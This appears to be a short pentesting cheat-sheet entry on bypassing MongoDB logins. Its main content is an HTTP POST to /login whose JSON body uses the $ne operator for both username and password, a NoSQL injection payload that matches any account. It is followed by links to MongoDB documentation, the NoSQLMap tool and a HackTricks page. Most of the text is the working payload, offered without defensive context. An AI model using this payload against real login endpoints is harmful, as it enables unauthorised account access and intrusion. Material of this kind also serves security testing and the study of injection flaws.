## MongoDB login bypass examples

```bash
POST /login HTTP/1.1
...
Content-Type: application/json
...

{
    "username":{
        "$ne":""
    },
    "password":{
        "$ne":""
    }
}


```


## Links

https://www.mongodb.com/docs/manual/reference/operator/query/ne/

https://github.com/codingo/NoSQLMap

https://book.hacktricks.xyz/pentesting-web/nosql-injection